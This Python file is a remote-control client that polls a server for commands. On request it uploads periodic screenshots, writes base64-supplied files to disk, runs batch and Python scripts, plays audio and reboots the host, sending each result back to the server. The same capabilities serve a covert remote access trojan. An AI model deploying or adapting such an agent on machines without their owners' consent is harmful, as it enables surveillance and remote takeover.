import base64
import io
import json
import mss
import os
import requests
import shutil
import subprocess
import sys
import time

from pathlib import Path
from PIL import Image
from threading import Thread

_cfg_path = Path(__file__).parent / "config.json"

with _cfg_path.open("r", encoding="utf-8") as f:
    cfg = json.load(f)

CLIENT_ID = cfg["CLIENT_ID"]
SERVER_URL = cfg["SERVER_URL"].rstrip("/") + "/"

CONNECT_URL = f"{SERVER_URL}connect"
GET_COMMANDS_URL = f"{SERVER_URL}commands/{CLIENT_ID}?not_in_progress=true"
POST_COMMAND_RESULT_URL = f"{SERVER_URL}commands/{CLIENT_ID}"
POST_SCREENSHOT_URL = f"{SERVER_URL}screenshot/{CLIENT_ID}"
POST_HEARTBEAT_URL = f"{SERVER_URL}heartbeat/{CLIENT_ID}"

HEARTBEAT_INTERVAL_SEC = float(cfg["HEARTBEAT_INTERVAL_SEC"])
CONNECT_RETRY_INTERVAL_SEC = float(cfg["CONNECT_RETRY_INTERVAL_SEC"])
CHECK_FOR_COMMANDS_INTERVAL_SEC = float(cfg["CHECK_FOR_COMMANDS_INTERVAL_SEC"])
SEND_SCREENSHOT_INTERVAL_SEC = float(cfg["SEND_SCREENSHOT_INTERVAL_SEC"])

REQUEST_TIMEOUT_SEC = float(cfg["REQUEST_TIMEOUT_SEC"])
SCREENSHOT_THREAD_JOIN_TIMEOUT_SEC = float(cfg["SCREENSHOT_THREAD_JOIN_TIMEOUT_SEC"])
STEEL_ALIVE_TIMEOUT_SEC = float(cfg["STEEL_ALIVE_TIMEOUT_SEC"])

SCREENSHOT_TARGET_WIDTH = int(cfg["SCREENSHOT_TARGET_WIDTH"])
SCREENSHOT_TARGET_HEIGHT = int(cfg["SCREENSHOT_TARGET_HEIGHT"])

START_SCREENSHOTS_COMMAND = cfg["START_SCREENSHOTS_COMMAND"]
STOP_SCREENSHOTS_COMMAND = cfg["STOP_SCREENSHOTS_COMMAND"]
PLAY_WAV_COMMAND = cfg["PLAY_WAV_COMMAND"]
RUN_BAT_COMMAND = cfg["RUN_BAT_COMMAND"]
RUN_PY_COMMAND = cfg["RUN_PY_COMMAND"]
SAVE_FILE_COMMAND = cfg["SAVE_FILE_COMMAND"]
REBOOT_COMMAND = cfg["REBOOT_COMMAND"]

COMMAND_STATUS_ATTR = cfg["COMMAND_STATUS_ATTR"]
COMMAND_STATUS_IN_PROGRESS = cfg["COMMAND_STATUS_IN_PROGRESS"]

should_send_heartbeat = True
should_check_for_commands = True
should_send_screenshots = False
screenshot_thread = None

def take_screenshot_b64(monitor, sct):
    sct_img = sct.grab(monitor)

    img = Image.frombytes('RGB', sct_img.size, sct_img.rgb)
    img = img.resize((SCREENSHOT_TARGET_WIDTH, SCREENSHOT_TARGET_HEIGHT), Image.LANCZOS)

    buf = io.BytesIO()
    img.save(buf, format='JPEG', quality=60, optimize=True)

    img_bytes = buf.getvalue()
    img_b64 = base64.b64encode(img_bytes).decode("utf-8")

    return img_b64

def get_data(url, timeout=REQUEST_TIMEOUT_SEC):
    try:
        return requests.get(url, timeout=timeout)
    except Exception:
        return None

def post_data(url, data=None, timeout=REQUEST_TIMEOUT_SEC):
    try:
        return requests.post(url, json=data, timeout=timeout)
    except Exception:
        return None

def post_command_result(command_name, result_ok, result_message):
    result = {
        "ok": result_ok,
        "message": result_message
    }

    data = {
        "command": command_name,
        "result": result
    }

    return post_data(POST_COMMAND_RESULT_URL, data)

def post_command_status(command_name, status):
    data = {
        "command": command_name,
        COMMAND_STATUS_ATTR: status
    }

    return post_data(POST_COMMAND_RESULT_URL, data)

def post_process_result(command_name, process):
    stdout, stderr = process.communicate()
    result_ok = process.returncode == 0

    result_message = {
        "stdout": stdout,
        "stderr": stderr
    }

    return post_command_result(command_name, result_ok, result_message)

def post_screenshot(img_b64):
    data = {
        "screenshot": img_b64
    }

    return post_data(POST_SCREENSHOT_URL, data)

def post_connect_to_server_request():
    data = {
        "client_id": CLIENT_ID
    }

    return post_data(CONNECT_URL, data)

def post_heartbeat_request():
    return post_data(POST_HEARTBEAT_URL)

def start_sending_screenshots():
    global should_send_screenshots
    global screenshot_thread

    if should_send_screenshots and screenshot_thread and screenshot_thread.is_alive():
        return False, None, "screenshots are already being sent"

    should_send_screenshots = True

    screenshot_thread = Thread(target=send_screenshots_worker, daemon=True)
    screenshot_thread.start()

    return True, None, "screenshots are starting to be sent"

def stop_sending_screenshots():
    global should_send_screenshots
    should_send_screenshots = False

    if screenshot_thread:
        screenshot_thread.join(timeout=SCREENSHOT_THREAD_JOIN_TIMEOUT_SEC)

    return True, None, "screenshots stopped being sent"

def play_wav_file(path):
    try:
        if not os.path.exists(path):
            return False, None, f"{path} not found"

        process = None

        if sys.platform.startswith("win"):
            # process = subprocess.Popen(["cmd", "/c", "start", "", "/min", path], shell=False)
            import winsound
            winsound.PlaySound(path, winsound.SND_FILENAME | winsound.SND_ASYNC)
        elif sys.platform.startswith("darwin"):
            process = subprocess.Popen(["afplay", path])
        else:
            if shutil.which("paplay"):
                process = subprocess.Popen(["paplay", path])
            elif shutil.which("aplay"):
                process = subprocess.Popen(["aplay", path])
            elif shutil.which("ffplay"):
                process = subprocess.Popen(
                    ["ffplay", "-nodisp", "-autoexit", path],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
            else:
                return False, None, "no suitable player found"

        return True, process, f"{path} started executing"
    except Exception as e:
        return False, None, str(e)

def run_bat(path):
    try:
        if not os.path.exists(path):
            return False, None, f"{path} not found"

        if sys.platform.startswith("win"):
            process = subprocess.Popen(
                ["cmd", "/c", path],
                shell=False,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )

            return True, process, f"{path} started executing"
        else:
            return False, None, f"platform {sys.platform} not supported"
    except Exception as e:
        return False, None, str(e)

def run_py(path):
    try:
        if not os.path.exists(path):
            return False, None, f"{path} not found"

        process = subprocess.Popen(
            [sys.executable, path],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )

        return True, process, f"{path} started executing"
    except Exception as e:
        return False, None, str(e)

def save_file(file_name, file_b64):
    try:
        file_bytes = base64.b64decode(file_b64)

        with open(file_name, 'wb') as file:
            file.write(file_bytes)

        return True, None, f"{file_name} saved"
    except Exception as e:
        return False, None, str(e)

def reboot():
    try:
        if sys.platform.startswith("win"):
            os.system("shutdown /r /t 0")
        else:
            os.system("reboot")

        return True, None, "rebooted"
    except Exception as e:
        return False, None, str(e)

def connect_to_server_loop():
    while True:
        response = post_connect_to_server_request()

        if response and response.status_code == 200:
            return

        time.sleep(CONNECT_RETRY_INTERVAL_SEC)

def send_heartbeat_worker():
    global should_send_heartbeat

    while should_send_heartbeat:
        post_heartbeat_request()
        time.sleep(HEARTBEAT_INTERVAL_SEC)

def send_screenshots_worker():
    global should_send_screenshots

    try:
        with mss.mss() as sct:
            monitor = sct.monitors[0]

            while should_send_screenshots:
                try:
                    img_b64 = take_screenshot_b64(monitor, sct)
                    post_screenshot(img_b64)
                except Exception as e:
                    post_command_result(START_SCREENSHOTS_COMMAND, False, str(e))
                finally:
                    time.sleep(SEND_SCREENSHOT_INTERVAL_SEC)
    except Exception as e:
        post_command_result(START_SCREENSHOTS_COMMAND, False, str(e))

def process_commands(commands):
    command_ok = None
    commad_process = None
    command_message = None
    command_name = None

    if START_SCREENSHOTS_COMMAND in commands:
        command_name = START_SCREENSHOTS_COMMAND
        command_ok, commad_process, command_message = start_sending_screenshots()

    if STOP_SCREENSHOTS_COMMAND in commands:
        command_name = STOP_SCREENSHOTS_COMMAND
        command_ok, commad_process, command_message = stop_sending_screenshots()

    if PLAY_WAV_COMMAND in commands:
        payload = commands.get(PLAY_WAV_COMMAND)
        filename = payload.get("filename")

        command_name = PLAY_WAV_COMMAND
        command_ok, commad_process, command_message = play_wav_file(filename)

    if RUN_BAT_COMMAND in commands:
        payload = commands.get(RUN_BAT_COMMAND)
        filename = payload.get("filename")

        command_name = RUN_BAT_COMMAND
        command_ok, commad_process, command_message = run_bat(filename)

    if RUN_PY_COMMAND in commands:
        payload = commands.get(RUN_PY_COMMAND)
        filename = payload.get("filename")

        command_name = RUN_PY_COMMAND
        command_ok, commad_process, command_message = run_py(filename)

    if SAVE_FILE_COMMAND in commands:
        payload = commands.get(SAVE_FILE_COMMAND)
        file_name = payload.get("file_name")
        file_b64 = payload.get("file_b64")

        command_name = SAVE_FILE_COMMAND
        command_ok, commad_process, command_message = save_file(file_name, file_b64)

    if REBOOT_COMMAND in commands:
        command_name = REBOOT_COMMAND
        command_ok, commad_process, command_message = reboot()

    if command_name is None:
        return

    if commad_process:
        result_thread = Thread(target=post_process_result, args=(command_name, commad_process))
        result_thread.start()

        post_command_status(command_name, COMMAND_STATUS_IN_PROGRESS)
    else:
        post_command_result(command_name, command_ok, command_message)

def check_for_commands_loop():
    while True:
        try:
            response = get_data(GET_COMMANDS_URL)

            if not response or response.status_code != 200:
                continue

            commands = response.json().get("commands", {})
            process_commands(commands)
        except Exception:
            pass
        finally:
            time.sleep(CHECK_FOR_COMMANDS_INTERVAL_SEC)

if __name__ == '__main__':
    connect_to_server_loop()

    Thread(target=send_heartbeat_worker, daemon=True).start()
    Thread(target=check_for_commands_loop, daemon=True).start()

    while True:
        time.sleep(STEEL_ALIVE_TIMEOUT_SEC)
